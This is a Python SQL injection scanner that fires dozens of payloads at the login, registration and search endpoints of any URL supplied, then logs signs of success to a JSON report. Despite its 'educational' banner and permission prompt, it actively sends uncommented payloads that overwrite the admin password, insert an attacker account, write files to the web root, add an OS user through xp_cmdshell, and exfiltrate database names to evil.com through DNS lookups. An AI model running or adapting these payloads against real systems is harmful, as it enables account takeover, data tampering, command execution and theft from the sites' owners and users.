#!/usr/bin/env python3
import requests
import json
import sys
import time
import re
from urllib.parse import urljoin

class SecurityTester:
    def __init__(self, base_url, test_email=None):
        self.base_url = base_url.rstrip('/')
        self.test_email = test_email or "test@example.com"
        self.test_password = "Test123!"
        self.session = requests.Session()
        self.results = []

    def log(self, message, status="INFO"):
        print(f"[{status}] {message}")

    def test_sql_injection(self):
        """Test for SQL Injection vulnerabilities, including advanced payloads"""
        self.log("Testing SQL Injection, including advanced techniques...")

        login_url = f"{self.base_url}/api/login"
        register_url = f"{self.base_url}/api/register"
        search_url = f"{self.base_url}/api/search"  # If you have search functionality
        other_endpoints = [login_url, register_url, search_url]  # Add more if known

        # Basic and advanced SQL injection payloads, including high-impact ones
        # WARNING: Some payloads are destructive and should only be used in controlled environments!
        payloads = [
            # Basic bypass payloads
            {"email": "admin' --", "password": "anything"},
            {"email": "' OR '1'='1", "password": "' OR '1'='1"},
            {"email": "admin' OR '1'='1' --", "password": "anything"},
            {"email": "admin' OR 1=1 --", "password": "anything"},
            {"email": "' UNION SELECT null,user() --", "password": "anything"},
            {"email": "' OR 'a'='a' --", "password": "' OR 'a'='a' --"},

            # Time-based blind SQLi
            {"email": f"test@example.com' AND SLEEP(5) --", "password": "anything"},
            {"email": f"test@example.com' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", "password": "anything"},
            {"email": f"test@example.com' WAITFOR DELAY '0:0:5' --", "password": "anything"},  # MS SQL

            # Boolean-based blind SQLi
            {"email": f"admin' AND (SELECT COUNT(*) FROM users) > 0 --", "password": "anything"},
            {"email": f"admin' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1) = 'a' --", "password": "anything"},
            {"email": f"admin' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --", "password": "anything"},

            # Union-based SQLi for data extraction
            {"email": "' UNION SELECT database(), version() --", "password": "anything"},
            {"email": "' UNION SELECT table_name FROM information_schema.tables --", "password": "anything"},
            {"email": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --", "password": "anything"},
            {"email": "' UNION SELECT username, password FROM users --", "password": "anything"},  # High impact: dumps credentials

            # Error-based SQLi
            {"email": "' AND 1=CAST((SELECT database()) AS INT) --", "password": "anything"},
            {"email": "' AND (SELECT 1/0 FROM dual) --", "password": "anything"},  # Division by zero
            {"email": "extractvalue(1,concat(0x7e,(select database()))) --", "password": "anything"},  # XPath error

            # Out-of-band SQLi (requires DNS exfil, etc., hard to detect automatically)
            # Note: These may not trigger in automated tests without setup
            {"email": "' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.evil.com\\'))) --", "password": "anything"},

            # Stacked queries (high impact: multiple statements)
            {"email": "'; UPDATE users SET password='hacked' WHERE email='admin@example.com' --", "password": "anything"},  # Updates data
            {"email": "'; INSERT INTO users (email, password) VALUES ('hacker@example.com', 'hacked') --", "password": "anything"},  # Inserts new user

            # Destructive payloads (HIGH IMPACT - USE WITH EXTREME CAUTION)
            # {"email": "'; DROP TABLE users; --", "password": "anything"},  # Deletes table
            # {"email": "'; TRUNCATE TABLE users; --", "password": "anything"},  # Empties table
            # {"email": "'; SHUTDOWN; --", "password": "anything"},  # Shuts down database (if privileges allow)

            # Database-specific advanced payloads
            # MySQL
            {"email": "' UNION SELECT @@version --", "password": "anything"},
            {"email": "' INTO OUTFILE '/var/www/hacked.txt' --", "password": "anything"},  # Writes file (if privileges)
            # PostgreSQL
            {"email": "'; COPY users TO '/var/www/hacked.txt'; --", "password": "anything"},
            # MS SQL
            {"email": "'; EXEC xp_cmdshell 'net user hacker hacked /add'; --", "password": "anything"},  # Executes OS command (high impact)
            {"email": "'; DECLARE @x VARCHAR(99); SET @x='\\evil.com\'; EXEC master..xp_dirtree @x; --", "password": "anything"},  # OOB
        ]

        vulnerable = False

        for i, payload in enumerate(payloads):
            for endpoint in other_endpoints:
                if not endpoint:
                    continue
                try:
                    start_time = time.time()
                    response = self.session.post(
                        endpoint,
                        json=payload,
                        timeout=10
                    )
                    elapsed = time.time() - start_time

                    # Check for time-based SQLi
                    if elapsed > 5 and any(delay in str(payload) for delay in ["SLEEP", "WAITFOR", "DELAY"]):
                        self.log(f"⚠️ Time-based SQL Injection possible at {endpoint}! (Payload {i+1})", "WARNING")
                        vulnerable = True
                        self.results.append({
                            "vulnerability": "SQL Injection - Time Based",
                            "endpoint": endpoint,
                            "payload": payload,
                            "response_time": elapsed
                        })

                    # Check for successful bypass or data extraction
                    if response.status_code == 200:
                        resp_text = response.text.lower()
                        success_keywords = ["success", "logged in", "welcome", "inserted", "updated"]
                        data_keywords = ["users", "password", "email", "admin", "@@version", "information_schema"]
                        if any(keyword in resp_text for keyword in success_keywords + data_keywords):
                            self.log(f"⚠️ SQL Injection successful at {endpoint}! (Payload {i+1})", "WARNING")
                            vulnerable = True
                            self.results.append({
                                "vulnerability": "SQL Injection - Successful Exploitation",
                                "endpoint": endpoint,
                                "payload": payload,
                                "response": response.text[:200]
                            })

                    # Check for error-based SQLi (database errors in response)
                    error_keywords = ["sql syntax", "mysql", "postgres", "mssql", "division by zero", "extractvalue"]
                    if any(keyword in response.text.lower() for keyword in error_keywords):
                        self.log(f"⚠️ Error-based SQL Injection detected at {endpoint}! (Payload {i+1})", "WARNING")
                        vulnerable = True
                        self.results.append({
                            "vulnerability": "SQL Injection - Error Based",
                            "endpoint": endpoint,
                            "payload": payload,
                            "response": response.text[:200]
                        })

                except requests.exceptions.Timeout:
                    if any(delay in str(payload) for delay in ["SLEEP", "WAITFOR", "DELAY"]):
                        self.log(f"⚠️ Time-based SQL Injection detected at {endpoint}! (Timeout with payload {i+1})", "WARNING")
                        vulnerable = True
                        self.results.append({
                            "vulnerability": "SQL Injection - Time Based (Timeout)",
                            "endpoint": endpoint,
                            "payload": payload
                        })
                except Exception as e:
                    self.log(f"Error testing payload {i+1} at {endpoint}: {e}", "ERROR")

        if vulnerable:
            self.log("⚠️ WARNING: High-impact vulnerabilities detected. These could allow hackers to extract data, modify databases, or even execute system commands.", "WARNING")
            self.log("Recommendations: Use prepared statements, input validation, and least privilege principles.", "INFO")

        return vulnerable

    def run_sql_injection_test(self):
        """Run only the SQL injection security test"""
        self.log(f"Starting SQL injection tests for {self.base_url}")
        self.log("=" * 60)

        vulnerable = self.test_sql_injection()
        status = "VULNERABLE ⚠️" if vulnerable else "SECURE ✅"
        self.log(f"SQL Injection: {status}")

        # Print summary
        self.log("\n" + "=" * 60)
        self.log("SQL INJECTION TEST SUMMARY")
        self.log("=" * 60)

        if vulnerable:
            self.log("⚠️ VULNERABILITIES FOUND", "WARNING")
        else:
            self.log("✅ No vulnerabilities found!")

        # Save detailed report
        self.save_report()

    def save_report(self):
        """Save detailed vulnerability report"""
        report = {
            "base_url": self.base_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": self.results
        }

        try:
            with open("sql_injection_report.json", "w") as f:
                json.dump(report, f, indent=2)
            self.log("Detailed report saved to 'sql_injection_report.json'")
        except Exception as e:
            self.log(f"Error saving report: {e}", "ERROR")

def main():
    print("""
    ███████╗ ██████╗ ██╗     ██╗    ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
    ██╔════╝██╔═══██╗██║     ██║    ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
    ███████╗██║   ██║██║     ██║ █╗ ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
    ╚════██║██║   ██║██║     ██║███╗██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
    ███████║╚██████╔╝███████╗╚███╔███╔╝██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
    ╚══════╝ ╚═════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

    SQL Injection Testing Tool v1.0
    For educational purposes only! Includes advanced payloads that could have high impact.
    WARNING: Destructive payloads are commented out. Uncomment only in safe test environments.
    """)

    if len(sys.argv) < 2:
        print("Usage: python sql_injection_test.py <base_url> [test_email]")
        print("Example: python sql_injection_test.py https://your-site.com admin@example.com")
        sys.exit(1)

    base_url = sys.argv[1]
    test_email = sys.argv[2] if len(sys.argv) > 2 else None

    # Add protocol if missing
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'https://' + base_url

    print(f"\nTarget URL: {base_url}")

    confirm = input("\n⚠️ WARNING: This tool will test for SQL injection vulnerabilities, including advanced techniques. \n"
                    "Some payloads could modify or damage data if vulnerable. \n"
                    "Only use on websites you OWN or have PERMISSION to test. \n"
                    "Continue? (y/N): ")

    if confirm.lower() != 'y':
        print("Aborted.")
        sys.exit(0)

    tester = SecurityTester(base_url, test_email)
    tester.run_sql_injection_test()

    print("\n" + "=" * 60)
    print("IMPORTANT:")
    print("- This tool only tests for SQL injection vulnerabilities")
    print("- Includes advanced payloads used by hackers, such as data extraction, updates, and potential OS command execution")
    print("- High-impact payloads can lead to data loss, unauthorized access, or system compromise")
    print("- Manual verification and professional pentesting recommended")
    print("- Always test in a STAGING environment first")
    print("- Never test production systems without permission")
    print("=" * 60)

if __name__ == "__main__":
    main()
